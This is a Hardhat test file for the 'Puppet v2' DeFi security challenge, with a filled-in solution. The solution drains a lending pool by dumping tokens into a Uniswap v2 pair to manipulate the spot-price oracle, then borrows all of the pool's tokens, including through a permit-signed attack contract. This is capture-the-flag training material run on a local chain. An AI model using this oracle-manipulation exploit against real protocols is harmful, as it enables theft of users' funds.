const pairJson = require('@uniswap/v2-core/build/UniswapV2Pair.json')
const factoryJson = require('@uniswap/v2-core/build/UniswapV2Factory.json')
const routerJson = require('@uniswap/v2-periphery/build/UniswapV2Router02.json')

const { ethers } = require('hardhat')
const { expect } = require('chai')
const { setBalance } = require('@nomicfoundation/hardhat-network-helpers')

describe('[Challenge] Puppet v2', function () {
    let deployer, player
    let token, weth, uniswapFactory, uniswapRouter, uniswapExchange, lendingPool

    // Uniswap v2 exchange will start with 100 tokens and 10 WETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = 100n * 10n ** 18n
    const UNISWAP_INITIAL_WETH_RESERVE = 10n * 10n ** 18n

    const PLAYER_INITIAL_TOKEN_BALANCE = 10000n * 10n ** 18n
    const PLAYER_INITIAL_ETH_BALANCE = 20n * 10n ** 18n

    const POOL_INITIAL_TOKEN_BALANCE = 1000000n * 10n ** 18n

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        ;[deployer, player] = await ethers.getSigners()

        await setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE)
        expect(await ethers.provider.getBalance(player.address)).to.eq(
            PLAYER_INITIAL_ETH_BALANCE
        )

        const UniswapFactoryFactory = new ethers.ContractFactory(
            factoryJson.abi,
            factoryJson.bytecode,
            deployer
        )
        const UniswapRouterFactory = new ethers.ContractFactory(
            routerJson.abi,
            routerJson.bytecode,
            deployer
        )
        const UniswapPairFactory = new ethers.ContractFactory(
            pairJson.abi,
            pairJson.bytecode,
            deployer
        )

        // Deploy tokens to be traded
        token = await (
            await ethers.getContractFactory('DamnValuableToken', deployer)
        ).deploy()
        weth = await (await ethers.getContractFactory('WETH', deployer)).deploy()

        // Deploy Uniswap Factory and Router
        uniswapFactory = await UniswapFactoryFactory.deploy(
            ethers.constants.AddressZero
        )
        uniswapRouter = await UniswapRouterFactory.deploy(
            uniswapFactory.address,
            weth.address
        )

        // Create Uniswap pair against WETH and add liquidity
        await token.approve(uniswapRouter.address, UNISWAP_INITIAL_TOKEN_RESERVE)
        await uniswapRouter.addLiquidityETH(
            token.address,
            UNISWAP_INITIAL_TOKEN_RESERVE, // amountTokenDesired
            0, // amountTokenMin
            0, // amountETHMin
            deployer.address, // to
            (await ethers.provider.getBlock('latest')).timestamp * 2, // deadline
            { value: UNISWAP_INITIAL_WETH_RESERVE }
        )
        uniswapExchange = UniswapPairFactory.attach(
            await uniswapFactory.getPair(token.address, weth.address)
        )
        expect(await uniswapExchange.balanceOf(deployer.address)).to.be.gt(0)

        // Deploy the lending pool
        lendingPool = await (
            await ethers.getContractFactory('PuppetV2Pool', deployer)
        ).deploy(
            weth.address,
            token.address,
            uniswapExchange.address,
            uniswapFactory.address
        )

        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE)
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE)

        // Check pool's been correctly setup
        expect(await lendingPool.calculateDepositOfWETHRequired(10n ** 18n)).to.eq(
            3n * 10n ** 17n
        )
        expect(
            await lendingPool.calculateDepositOfWETHRequired(
                POOL_INITIAL_TOKEN_BALANCE
            )
        ).to.eq(300000n * 10n ** 18n)
    })

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        async function attackWithContract() {
            const { signERC2612Permit } = require('eth-permit')
            const attackContractAddress = ethers.utils.getContractAddress({
                from: player.address,
                nonce: await ethers.provider.getTransactionCount(player.address)
            })
            const { v, r, s } = await signERC2612Permit(
                ethers.provider,
                token.address,
                player.address,
                attackContractAddress,
                PLAYER_INITIAL_TOKEN_BALANCE.toString()
            )

            const attackContractFactory = await ethers.getContractFactory(
                'AttackPuppet_v2'
            )
            const bytecode = attackContractFactory.bytecode
            const deployData = attackContractFactory.interface.encodeDeploy([
                uniswapRouter.address,
                lendingPool.address,
                weth.address,
                token.address,
                v,
                r,
                s
            ])
            const gasCost = ethers.utils
                .parseUnits('0.5', 9)
                .mul('30000000')
                .toBigInt()

            const tx = {
                to: null,
                data: ethers.utils.hexConcat([bytecode, deployData]),
                value: PLAYER_INITIAL_ETH_BALANCE - gasCost,
                gasPrice: ethers.utils.parseUnits('0.5', 9),
                gasLimit: 30000000n
            }

            await player.sendTransaction(tx)
        }
        async function attack() {
            //swap token to eth
            const approveTx = {
                to: token.address,
                data: token.interface.encodeFunctionData('approve', [
                    uniswapRouter.address,
                    PLAYER_INITIAL_TOKEN_BALANCE
                ]),
                gasLimit: 30000000n
            }
            const swapTx = {
                to: uniswapRouter.address,
                data: uniswapRouter.interface.encodeFunctionData(
                    'swapExactTokensForETH',
                    [
                        PLAYER_INITIAL_TOKEN_BALANCE,
                        0,
                        [token.address, weth.address],
                        player.address,
                        ethers.constants.MaxUint256
                    ]
                ),
                gasLimit: 30000000n
            }
            //deposit eth to weth
            const depositTx = {
                to: weth.address,
                data: weth.interface.encodeFunctionData('deposit'),
                value: 29496494833197321980n,
                gasLimit: 30000000n
            }
            //borrow
            const approveWethTx = {
                to: weth.address,
                data: weth.interface.encodeFunctionData('approve', [
                    lendingPool.address,
                    29496494833197321980n
                ]),
                gasLimit: 30000000n
            }
            const borrowTx = {
                to: lendingPool.address,
                data: lendingPool.interface.encodeFunctionData('borrow', [
                    POOL_INITIAL_TOKEN_BALANCE
                ]),
                gasLimit: 30000000n
            }

            const callTxs = [approveTx, swapTx, depositTx, approveWethTx, borrowTx]

            callTxs.forEach(async (tx) => await player.sendTransaction(tx))
        }
        await attackWithContract()
    })

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        // Player has taken all tokens from the pool
        expect(await token.balanceOf(lendingPool.address)).to.be.eq(0)

        expect(await token.balanceOf(player.address)).to.be.gte(
            POOL_INITIAL_TOKEN_BALANCE
        )
    })
})
